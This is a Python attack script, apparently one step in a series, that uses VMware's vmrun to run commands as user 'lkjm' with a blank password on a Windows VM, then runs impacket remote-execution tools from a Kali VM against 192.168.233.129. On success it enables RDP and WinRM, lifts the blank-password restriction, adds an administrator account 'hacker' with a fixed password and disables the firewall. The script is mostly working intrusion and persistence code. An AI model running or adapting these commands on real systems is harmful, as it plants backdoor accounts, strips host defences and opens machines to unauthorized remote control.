#!/usr/bin/env python3
"""Step 13: Use vmrun directly on TARGET Windows VM
If VMware Tools is installed, we can execute commands with blank password
Also try impacket with correct syntax
"""
import subprocess
import os

VMRUN = r'D:\software\vmware\tool\vmrun.exe'
TEMP = os.environ.get('TEMP', r'C:\Users\xianyv\AppData\Local\Temp')

# Find target Windows VM
# The user's VM could be in various locations
TARGET_VM_PATHS = [
    r'E:\BaiduNetdiskDownload\Windows 10 x64\Windows 10 x64.vmx',
    r'E:\BaiduNetdiskDownload\Windows 10\Windows 10.vmx',
    r'D:\software\vmware\project\Windows 10 x64\Windows 10 x64.vmx',
    r'D:\software\vmware\project\Windows 10\Windows 10.vmx',
]

def find_target_vmx():
    """Find the target Windows VM path"""
    # List all running VMs
    result = subprocess.run([VMRUN, 'list'], capture_output=True, text=True, timeout=10)
    print(f"[*] Running VMs:\n{result.stdout}")
    return result.stdout

def try_vmrun_on_target(vmx_path, user, pwd, cmd):
    """Try to execute command on target VM via vmrun"""
    try:
        args = [VMRUN, '-T', 'ws', '-gu', user, '-gp', pwd,
                'runProgramInGuest', vmx_path,
                '-activeWindow',
                'cmd.exe', '/c', f'{cmd} > C:\\temp_output.txt 2>&1']
        result = subprocess.run(args, capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0:
            # Read output
            temp_file = os.path.join(TEMP, 'target_output.txt')
            subprocess.run([VMRUN, '-T', 'ws', '-gu', user, '-gp', pwd,
                           'copyFileFromGuestToHost', vmx_path,
                           'C:\\temp_output.txt', temp_file],
                          capture_output=True, text=True, timeout=30)
            try:
                with open(temp_file, 'r', encoding='utf-8', errors='ignore') as f:
                    return f.read()
            except:
                return f"[OK but no output] returncode=0"
        else:
            return f"[FAILED] {result.stderr}"
    except Exception as e:
        return f"[ERROR] {e}"

# 1. Find running VMs
print("=" * 60)
print("[1] List running VMs")
print("=" * 60)
vms = find_target_vmx()

# 2. Try vmrun on each potential VM path
print("\n" + "=" * 60)
print("[2] Try vmrun on target Windows VM")
print("=" * 60)

# Extract VM paths from running VMs list
vm_paths = []
for line in vms.split('\n'):
    if '.vmx' in line and 'kali' not in line.lower():
        vm_paths.append(line.strip())
    elif '.vmx' in line:
        print(f"  Found: {line.strip()}")

# Also try the paths we know
all_paths = vm_paths + TARGET_VM_PATHS
# Remove duplicates while preserving order
seen = set()
unique_paths = []
for p in all_paths:
    if p and p not in seen:
        seen.add(p)
        unique_paths.append(p)

for vmx in unique_paths:
    if not vmx:
        continue
    print(f"\n[*] Trying: {vmx}")
    
    # Try with lkjm and blank password
    out = try_vmrun_on_target(vmx, 'lkjm', '', 'whoami')
    print(f"  lkjm/blank: {out}")
    
    if "[FAILED]" not in out and "[ERROR]" not in out:
        print(f"\n[+] SUCCESS! Connected to {vmx}")
        
        # Now execute exploitation commands
        print("\n[*] Enabling RDP...")
        out = try_vmrun_on_target(vmx, 'lkjm', '', 
            'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
        print(f"  RDP enable: {out}")
        
        print("\n[*] Disabling blank password restriction...")
        out = try_vmrun_on_target(vmx, 'lkjm', '',
            'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f')
        print(f"  LimitBlankPasswordUse: {out}")
        
        print("\n[*] Enabling WinRM...")
        out = try_vmrun_on_target(vmx, 'lkjm', '',
            'powershell -Command "Enable-PSRemoting -Force"')
        print(f"  WinRM: {out}")
        
        print("\n[*] Adding admin user...")
        out = try_vmrun_on_target(vmx, 'lkjm', '',
            'net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add')
        print(f"  Add user: {out}")
        
        print("\n[*] Disabling firewall...")
        out = try_vmrun_on_target(vmx, 'lkjm', '',
            'netsh advfirewall set allprofiles state off')
        print(f"  Firewall: {out}")
        
        break

# 3. Try impacket with correct syntax on Kali
print("\n" + "=" * 60)
print("[3] Impacket with correct auth syntax (via Kali)")
print("=" * 60)

# Write impacket commands with proper format
VMX_KALI = r'E:\BaiduNetdiskDownload\kali-linux-2026.1-vmware-amd64.vmwarevm\kali-linux-2026.1-vmware-amd64.vmx'

def run_kali(cmd, timeout=120):
    script_path = os.path.join(TEMP, 'kali_cmd.sh')
    with open(script_path, 'w', encoding='utf-8', newline='\n') as f:
        f.write(f'#!/bin/bash\n{cmd}\n')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromHostToGuest', VMX_KALI,
                    script_path, '/tmp/kali_cmd.sh'],
                   capture_output=True, text=True, timeout=30)
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'runProgramInGuest', VMX_KALI,
                    '/bin/bash', '-c',
                    f'chmod +x /tmp/kali_cmd.sh && timeout {timeout} /tmp/kali_cmd.sh > /tmp/kali_out.txt 2>&1'],
                   capture_output=True, text=True, timeout=timeout + 30)
    out_path = os.path.join(TEMP, 'kali_out.txt')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromGuestToHost', VMX_KALI,
                    '/tmp/kali_out.txt', out_path],
                   capture_output=True, text=True, timeout=30)
    try:
        with open(out_path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except:
        return "[READ ERROR]"

# Try impacket-psexec with proper format (DOMAIN/USER:PASS@HOST)
out = run_kali(
    "impacket-psexec 'DESKTOP-A0LQ308/lkjm:@192.168.233.129' whoami 2>&1 | head -20",
    timeout=30
)
print("psexec:", out)

out = run_kali(
    "impacket-wmiexec 'DESKTOP-A0LQ308/lkjm:@192.168.233.129' 'whoami' 2>&1 | head -20",
    timeout=30
)
print("wmiexec:", out)

out = run_kali(
    "impacket-smbexec 'DESKTOP-A0LQ308/lkjm:@192.168.233.129' 2>&1 | head -20",
    timeout=30
)
print("smbexec:", out)

# Try with -no-pass flag
out = run_kali(
    "impacket-psexec 'DESKTOP-A0LQ308/lkjm@192.168.233.129' -no-pass whoami 2>&1 | head -20",
    timeout=30
)
print("psexec -no-pass:", out)

# 4. Try to modify blank password restriction via DCOM (no auth needed)
print("\n" + "=" * 60)
print("[4] Impacket DCOMExec")
print("=" * 60)
out = run_kali(
    "impacket-dcomexec 'DESKTOP-A0LQ308/lkjm:@192.168.233.129' 'whoami' 2>&1 | head -20",
    timeout=30
)
print("dcomexec:", out)

print("\n" + "=" * 60)
print("VMRUN + IMPACKET PHASE COMPLETE")
print("=" * 60)
